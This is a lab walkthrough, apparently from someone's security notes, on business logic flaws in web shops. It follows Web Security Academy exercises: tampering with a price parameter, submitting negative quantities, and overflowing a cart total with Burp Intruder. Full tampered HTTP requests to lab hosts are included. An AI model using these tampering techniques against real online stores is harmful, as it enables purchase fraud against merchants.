## Business logic vulnerabilities

Business logic vulnerabilities need manual intervention as No tool can detect these and they can vary from application to application and very hazardous. 
We have to understand application logic, application functionality, implementations, and business requirements. Whenever we intercept the request,
we have to manipulate specific parameters in the request or so to test for the business logic vulnerability


 ## Some common example of business logic:
 
 Manipulation in the product price in the request so we can purchase products in less amount during the online shopping.
 
 Manipulation in user-supplied input (too much quantity or –ve quantity) and not checked from the server-side.
 
 Manipulation in intended flow (2FA).
 
 ## 1. Manipulation in the product price in the request so we can purchase products in less amount during the online shopping.
 
 With Burp running, log in and attempt to buy the leather jacket. The order is rejected because you don't have enough store credit. 
 
 In Burp, go to "Proxy" > "HTTP history" and study the order process. Notice that when you add an item to your cart,
 the corresponding request contains a price parameter. Send the POST /cart request to Burp Repeater. 
 
 ## Request 
 
    POST /cart HTTP/1.1
    Host: 0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
    Cookie: session=VQHFrZjrndyN8kEb1ivgOD4X9YydBrGB
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    Origin: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
    Referer: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net/product?productId=1
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    productId=1&redir=PRODUCT&quantity=1&price=133700
    
 ## Note That Show Price in request 
 
     productId=1&redir=PRODUCT&quantity=1&price=133700   
     
 So Change The Price and sand the request in server, like server is accept the request, here business logic vulnerabilities
 
 
 ## 2. High-level logic vulnerability
 
 Your card amount 100$ but you wante purchase 200$ product, buy 2 product first product price 50$ and secand product price 150$
 
 First Product nurp request sand burp repeter and  Observe that product quantity=1 so chnage the product guantity add -
 
 just like quantity=-2 and sand the request in server, accept the request, this is vulnerability 
 
 ## Request 
 
    POST /cart HTTP/1.1
    Host: 0ab6005b04eb8061c0d3246e00430049.web-security-academy.net
    Cookie: session=BC6C85CuO7OKzvT5oSjqsThv5qBb6Xap
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 37
    Origin: https://0ab6005b04eb8061c0d3246e00430049.web-security-academy.net
    Referer: https://0ab6005b04eb8061c0d3246e00430049.web-security-academy.net/product?productId=2
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    productId=2&redir=PRODUCT&quantity=1
 
 Change The product header like quantity=1 so change quantity=-2
 
    productId=2&redir=PRODUCT&quantity=-2
    
 Your product price 100$ so buy know the product price 200$ but this is vulnerable so your product price 100$
     
     
 ## 3. Low-level logic flaw
 
 First Add 2 product, first product price is 100$, secand product price is 200$, Total price is 300$, 
 
 some appliction limited add product, so add unlimited product the price is less the price {-} so this is vulnerblity
 
 how to find, simple, On the "Payloads" tab, select the payload type "Null payloads". Under "Payload options", select "Continue indefinitely". Start the attack 
 
 While the attack is running, go to your cart. Keep refreshing the page every so often and monitor the total price. Eventually, notice that the price suddenly switches to a large negative integer
 
 ## This is Vulnerblity
 
 Create the same Intruder attack again, but this time, under "Payloads" > "Payload Options", choose to generate exactly 323 payloads. 
 
 Notice That the price is negative like -100 so add some product and price is positive 100 so buy the product, This is Low-level logic flaw
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  
